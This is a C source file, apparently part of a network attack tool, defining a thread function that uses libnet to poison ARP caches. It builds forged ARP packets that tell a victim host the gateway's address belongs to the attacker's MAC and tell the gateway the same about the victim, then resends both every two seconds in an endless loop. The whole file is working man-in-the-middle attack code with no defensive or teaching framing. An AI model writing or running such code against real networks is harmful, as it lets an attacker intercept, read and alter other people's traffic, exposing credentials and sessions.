#include "header.h"

void *thread1_send_arp(void *arg)
{
    char error[LIBNET_ERRBUF_SIZE];
    if (getuid() && geteuid()) {
      fprintf(stderr, "must be run as root");
      exit(1);
    }

    addr_t *table = (addr_t *)arg;
    spoof_t victim, gateway;

    //set table for victim
    memcpy(victim.ip_dst, (char*)&table->ip_victim, IP_ALEN);
    memcpy(victim.ip_src, (char*)&table->ip_gateway, IP_ALEN);
    memcpy(victim.eth_dst, table->mac_victim, ETH_ALEN);
    memcpy(victim.eth_src, table->mac_me, ETH_ALEN);

    //set table for gateway
    memcpy(gateway.ip_dst, (char*)&table->ip_gateway, IP_ALEN);
    memcpy(gateway.ip_src, (char*)&table->ip_victim, IP_ALEN);
    memcpy(gateway.eth_dst, table->mac_gateway, ETH_ALEN);
    memcpy(gateway.eth_src, table->mac_me, ETH_ALEN);

    libnet_t *libnet1 = NULL;
    libnet_t *libnet2 = NULL;

    // open libnet
    libnet1 = libnet_init(LIBNET_LINK, "ens33", error); //ens33 is device name
    libnet2 = libnet_init(LIBNET_LINK, "ens33", error); //ens33 is device name

    static libnet_ptag_t victim_arp=0, victim_eth=0;
    static libnet_ptag_t gateway_arp=0, gateway_eth=0;

    //set packet
    victim_arp = libnet_build_arp(
       ARPHRD_ETHER,
       ETHERTYPE_IP,
       ETH_ALEN, IP_ALEN,
       ARPOP_REQUEST,
       victim.eth_src, victim.ip_src,
       victim.eth_dst, victim.ip_dst,
       NULL, 0,
       libnet1,
       victim_arp);

    victim_eth = libnet_build_ethernet(
       victim.eth_dst, victim.eth_src,
       ETHERTYPE_ARP,
       NULL, 0,
       libnet1,
       victim_eth);



    gateway_arp = libnet_build_arp(
       ARPHRD_ETHER,
       ETHERTYPE_IP,
       ETH_ALEN, IP_ALEN,
       ARPOP_REQUEST,
       gateway.eth_src, gateway.ip_src,
       gateway.eth_dst, gateway.ip_dst,
       NULL, 0,
       libnet2,
       gateway_arp);

    gateway_eth = libnet_build_ethernet(
       gateway.eth_dst, gateway.eth_src,
       ETHERTYPE_ARP,
       NULL, 0,
       libnet2,
       gateway_eth);

    while(1){
        int c = libnet_write(libnet1);
        int d = libnet_write(libnet2);
        sleep(2);
    }

    libnet_destroy(libnet1);
    libnet_destroy(libnet2);
}
